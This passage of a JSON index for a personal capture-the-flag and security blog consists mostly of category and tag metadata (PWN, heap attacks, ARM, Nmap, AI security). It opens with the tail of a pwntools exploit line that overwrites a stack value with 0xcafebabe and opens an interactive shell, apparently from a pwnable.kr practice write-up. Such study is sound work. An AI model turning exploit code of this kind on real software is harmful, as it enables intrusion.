p32(0xcafebabe)io.interactive()","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]}],"categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.xyz","slug":"PWN/Pwnable-xyz","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-xyz/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"},{"name":"ARM汇编","slug":"ARM汇编","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/ARM%E6%B1%87%E7%BC%96/"},{"name":"AD_World","slug":"PWN/AD-World","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/AD-World/"},{"name":"Pwnable.tw","slug":"PWN/Pwnable-tw","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-tw/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/"},{"name":"AI安全","slug":"Machine-Learning/AI安全","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/AI%E5%AE%89%E5%85%A8/"},{"name":"Heap","slug":"PWN/Heap","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/"},{"name":"Heap_Attack","slug":"PWN/Heap/Heap-Attack","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/Heap-Attack/"},{"name":"Python","slug":"Python","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Python/"},{"name":"Web","slug":"Python/Web","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Python/Web/"},{"name":"Heap_Basic","slug":"PWN/Heap/Heap-Basic","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/Heap-Basic/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"},{"name":"ARM","slug":"ARM","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/ARM/"},{"name":"Stack","slug":"Stack","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Stack/"},{"name":"AI","slug":"AI","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/AI/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Machine-Learning/"},{"name":"Python","slug":"Python","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Python/"},{"name":"Nmap","slug":"Nmap","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Nmap/"}]}